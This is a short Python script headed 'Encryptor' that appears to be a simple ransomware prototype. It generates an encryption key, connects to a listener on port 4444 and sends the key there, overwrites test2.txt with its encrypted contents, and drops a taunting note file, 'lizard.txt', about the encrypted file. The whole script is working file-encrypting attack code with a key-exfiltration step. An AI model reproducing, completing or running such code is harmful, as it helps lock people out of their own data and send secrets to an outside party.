# Encryptor

# We use cryptography for encryption and Fernet to handle keys
from cryptography.fernet import Fernet

import socket
import threading

# Generating key
key = Fernet.generate_key()

f = Fernet(key)

# fEncoded = f.code("UTF-8")

filename = "test2.txt"

host = "0.0.0.0"

port = 4444

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client.connect((host, port))

client.send(key)

# Opens the file and does its thing
with open(filename, "rb") as file:
	fileData = file.read()
	encryptedData = f.encrypt(fileData)

# Now it is encrypted
with open(filename, "wb") as file:
	file.write(encryptedData)

keyToSendUTF8 = key.decode("utf-8")

newFile = open("lizard.txt", "x")
newFile.write(f"Your file has been encrypted, but don't worry cause this is your key to be free ;)\n {keyToSendUTF8}")